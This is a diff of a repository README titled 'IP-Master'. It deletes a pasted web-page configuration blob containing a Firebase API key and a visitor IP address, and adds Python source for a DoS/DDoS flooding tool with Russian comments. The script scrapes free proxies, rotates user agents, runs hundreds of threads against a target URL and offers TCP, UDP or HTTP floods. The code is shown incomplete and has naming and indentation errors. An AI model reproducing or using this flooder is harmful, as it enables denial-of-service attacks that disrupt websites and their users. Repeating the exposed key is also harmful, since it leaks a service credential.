@@ -1,2 +1,137 @@
 # IP-Master
-CT_ADV_CRITEO_CATEGORY": true, "CORE_JSX_MIGRATED_SHOPPING_CART_MOBILE": true, "CORE_HOSTEL": false, "FCM_CREDENTIALS": {"apiKey": "AIzaSyBBbi58fb_irUmCjvG799Z9qtQFHgnAWvU", "authDomain": "promua-production.firebaseapp.com", "databaseURL": "https://promua-production.firebaseio.com", "storageBucket": "promua-production.appspot.com", "messagingSenderId": "885173030464"}, "FIREBASE_WEB_PUSH_SUBSCRIPTIONS": [], "CORE_WEB_PUSH_SOUNDS_SETTINGS": {"orders": true, "messages": true}, "CMS_IS_TRANSLATION_AVAILABLE": true, "CRM_WAYFORPAY_REGULAR_PAYMENTS_ENABLED": true, "CRM_RECURRING_PAYMENTS_WITH_MINIMUM_BALANCE": true, "MRD_IMPORT_SERVICE": false, "MRD_IMPORT_FILE_FROM_GD": true, "MRD_IMPORT_DEFAULT_MISSING_GROUPS_TO_PARENT": true, "MRD_HIDE_GUARANTEED_PURCHASE_LP": true, "MRD_IMPORT_RENAME_FIELDS": true, "MRD_NEW_PRODUCT_MOVING": true, "MRD_SHOW_EVOPAY_LP": false, "MRD_VARIATIONS_INHERIT_PROMOTIONS": true, "MRD_ROZETKA_APP": true, "MRD_BACKUP_RESTORE": true, "MRD_SITES_COOKIE_POPUP": true, "MRD_IMPORT_GIFTS_AND_ACCESSORIES": true, "MRD_VARIATIONS_DELETE_ATTRS": true, "MRD_ROZETKA_ORDERS": true, "MRD_VARIATIONS_ATTRS_LIMIT": false, "MRD_VARIATIONS_SHOW_BASE": false, "MRD_NP_SAVING_CREATED_DECLARATION_NUMBER": true, "MRD_IMPORT_MULTI_URLS": true, "MRD_SORT_PRODUCTS_IN_GROUPS": true, "MRD_HIDE_PRODUCT_ORDERS_COUNTER": true, "MRD_COMPANY_SITE_APP": false, "MRD_PICKUP_APPLICATION_ADD_REGION_SELECTOR": true, "MRD_JUSTIN_SHIPMENT_GENERATION": true, "CRM_NEW_SOCIAL_AUTH": true, "CRM_SMARTLOCK": false, "CRM_JOIN_NOW_MOBILE_AB_TEST": true, "CRM_NEW_PAYMENT_FLOW": true, "CONTENT_ADD_PRESENCE_SURE_YML": true, "CONTENT_KABANCHIK_LP": true, "CORE_SAFARI_SC": false, "CORE_PARTIAL_EDIT_CONTEXT": true, "PORTABLE_SPA": false, "content_gemius": true, "CONTENT_CLASSIFIED_ENABLED": true, "CONTENT_CLASSIFIED_USER_MENU": true, "CONTENT_TAGGED_PROSALE_TOKEN": false}, "CORE_NEW_PORTAL_THANK_YOU_PAGE": true, "CORE_NEW_RATING_CMS_POPUP": false, "CORE_NEW_COMPANY_SITE_THANK_YOU_PAGE": true, "COUNTRY": {"phone_code": "380", "portable_phone_code": "38", "internal_phone_code": "0", "phone_code_by_ip": "380", "currency": "\u0433\u0440\u043d.", "defaultCurrencyText": "\u0433\u0440\u043d", "defaultCurrencyCode": "UAH", "code": "UA"}, "REGION": {"id": null}, "USER": {"id": null, "first_name": "", "full_name": "", "gender": null, "evo_id": null, "email": "", "photo": null, "ip": "46.211.27.225", "company_id": null, "company_design_version": false, "has_company": false, "has_c2c_company": false, "phone": null, "phone_raw": null, "has_verified_phone": false, "region_id": null, "roles": [], "IS_ANONYMOUS": true, "IS_ADMIN": false, "IS_REMOTE_MODERATOR": false, "IS_MANAGER": false, "IS_AGENCY_EMPLOYEE": false, "IS_COMPANY_ADMIN": false, "IS_COMPANY_OWNER": false, "IS_PROM_EMPLOYEE": false, "IS_SUDO_MODE": false}, "SHOPPING_CART": {"cart_product_ids": [], "cart_bigl_product_ids": [], "should_open_immediately": ""}, "ROUTING": {"ckeditor": {"UAPROM_STYLE": "https://uaprom-static.c.prom.st/js/ckeditor_latest/style.css?rev=4776b3a9b9ac400510483d826414efc0a7f78f06", "customConfig": "https://uaprom-static.c.prom.st/js/ckeditor_latest/config.js?rev=4776b3a9b9ac400510483d826414efc0a7f78f06", "ckeditor": "https://uaprom-static.c.prom.st/js/ckeditor_latest/ckeditor.js?rev=4776b3a9b9ac400510483d826414efc0a7f78f06", "CKEDITOR_BASEPATH": "https://uaprom-static.c.prom.st/js/ckeditor_latest/", "IMAGE_UPLOAD_URL": "https://my.prom.ua/media/upload_image?profile=0&preview_height=640&preview_width=640&use_existing=1"}, "cabinet": {"product": {"category": {"autocomplete": "//suggester-ua-prod.evo.run/search_suggester/suggest_categories_for_cabinet.js"}}}, "blocks": {"related_category_url": "/remote/product_recommendations/get_related_categories"}, "admin": {"crm_help": {"create": "/remote/crm_help/create", "edit": "/remote/crm_help/edit"}, "agency_rate": {"save_pro_sale_rate": "/remote/agency_rate/save_pro_sale_rate"}}, "portal": {"registration": {"register_company": "/remote/registration/register_company", "save_checklist": "/remote/registration/save_checklist"}}}, "ajax_loader": "http
+# -*- coding: utf-8 -*-
+import urllib.request
+import sys
+from scapy.all import * #отличная либа
+# Импортируем либы
+import socket
+import socks
+import argparse
+import threading
+import random
+
+
+
+author = "Жмышенко Валерий Альбертович 54 года"
+
+
+ites = ["https://www.socks-proxy.net/","http://free-proxy-list.net/"] #Сайты откуда берем прокси
+useragents = []
+##Мощность DoS-а зависит от вашего интернет соеденения!!!
+multiple = 100 # Умножение, значение можно менять
+threads = 922 # Кол-во потоков, можно менять
+choice1 = 0 #Для настройки типа флуда
+choice2 = 0 #Для настройки типа флуда
+choice3 = 0 #Для настройки типа флуда
+port = 80 # Порт куда будут слаться заросы, можно менять
+
+
+##### Добавляем в программу аргументы
+parser = argparse.ArgumentParser()
+parser.add_argument('-useragent', help = 'Путь до файла с user-агентами')
+parser.add_argument('-proxylist', help = 'Путь до файла с proxy')
+parser.add_argument('-url', help = 'Цель')
+parser.add_argument('-getproxy', help = 'Получить прокси? 1 - да | 0 - нет')
+args = parser.parse_args()
+useragents_file = args.useragent
+needproxy = args.getproxy
+url = args.url
+proxies_list = args.proxylist
+if proxies_list == "": # Если прокси не указана закрыть программу
+    print("Укажи прокси!")
+    exit()
+if useragents_file == "": # Если useragent-ы не указаны закрыть программу
+    print("Укажи useragent-ов!")
+    exit()
+proxies = open(proxies_list).readlines() # Читаем прокси
+
+
+###### Получение юзер агента с файла
+handle = open(useragents_file)
+for x in handle:
+    useragents.append(x)
+useragents = map(lambda s: s.strip(), useragents)
+useragents = list(useragents)
+######
+
+def checkURL(): #Редактируем URL
+    global url
+    global url2
+    global urlport
+
+
+    try:
+        if url[0]+url[1]+url[2]+url[3] == "www.":
+            url = "http://" + url
+        elif url[0]+url[1]+url[2]+url[3] == "http":
+            pass
+        else:
+            url = "http://" + url
+    except:
+        print("Ошибка!")
+        exit()
+
+    try:
+        url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+    except:
+        url2 = url.replace("http://", "").replace("https://", "").split("/")[0]
+
+    try:
+        urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
+    except:
+        urlport = "80"
+
+
+
+
+def getPROXY(urlproxy):
+    try:
+        req = urllib.request.Request(("{0}").format(str(urlproxy)))
+        req.add_header("User-Agent", random.choice(useragents))
+        sourcecode = urllib.request.urlopen(req)
+        part = str(sourcecode.read())
+        part = part.split("<tbody>")
+        part = part[1].split("</tbody>")
+        part = part[0].split("<tr><td>")
+        proxies = ""
+        for proxy in part:
+            proxy = proxy.split("</td><td>") #Получаем прокси с сайта путем разделения тегов
+            try:
+                proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
+            except:
+                pass
+        handle = open("proxy.txt","a") #Записуем полученные прокси в файл
+        handle.write("")
+        handle.write(proxies)
+        handle.close()
+        print ("Прокси скачаны успешно!")
+    except:
+        print ("Ошибка!")
+
+
+
+if needproxy == "1": # Нужно ли качать прокси?
+    #### Получение проксей
+    for x in sites:
+        getPROXY(x)
+    ####
+
+
+    def typeflood(): # Определяем тип флуда
+    global choice1 #Для сайтов самый сильный - HTTP
+    global choice2
+    global choice3
+
+    select = input("UDP или TCP или HTTP? => ")
+    if select == "TCP":
+        choice1 = "1" # Изначально программа была в интерактивном режиме
+        choice2 = "y" # Но я убрал его, оставив лишь выбор метода флуда
+        choice3 = "0" # Поэтому переменные называются choice))
+    if select == "UDP":
+        choice1 = "2"
+        choice2 = "y" #Тестить мощь ваше DoS-а или DDoS-а можно здесь: https://www.vedbex.com/tools/dstat
+        choice3 = "0"
+    if select == "HTTP":
+        choice1 = "0"
+        choice2 = "y"
+        choice3 = "0"
